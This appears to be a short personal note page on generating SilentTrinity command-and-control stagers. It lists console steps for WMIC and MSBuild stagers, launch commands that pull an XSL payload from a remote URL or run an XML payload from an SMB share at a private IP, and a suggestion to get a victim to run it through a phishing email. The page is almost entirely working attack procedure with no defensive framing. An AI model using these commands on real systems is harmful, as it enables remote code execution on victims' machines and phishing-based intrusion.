<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Create A Stager For Listener</title>
</head><body>ST&gt;&gt; stagers<br/>
ST (stagers) &gt;&gt; list<br/>
<br/>
<b>WMIC</b><br/>
ST (stagers) &gt;&gt; use wmic<br/>
ST (stagers)(wmic) &gt;&gt; generate &lt;listener name&gt;<br/>
[+] Generated stager to wmic.xsl<br/>
[*] Launch with:<br/>
&nbsp;&#09;C:\Windows\system32\wbem\wmic.exe os get /format:"https://myurl/wmic.xsl"<br/>
&nbsp;&#09;C:\Windows\system32\wbem\wmic.exe os get /format:"wmic.xsl"<br/>
<br/>
Should be in SilentTrinity/Server/wmic.xsl<br/>
<br/>
Need to start own web server to host wmic.xsl or transfer it to target and execute locally<br/>
<br/>
<br/>
<br/>
<b>MSBUILD</b><br/>
ST (stagers) &gt;&gt; use msbuild<br/>
ST (stagers)(msbuild) &gt;&gt; generate &lt;listener name&gt;<br/>
[+] Generated stager to msbuild.xml<br/>
[*] Launch with 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe msbuild.xml'<br/>
<br/>
Finally, the trick now is to get the victim to execute the xml file via SMB path. Of course this is easy if you already have a shell on the machine, otherwise itâ€™s possible to embed this link in a phishing email.<br/>
<br/>
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe \\192.168.43.248\SMB\msbuild.xml<br/>
<br/>
</body></html>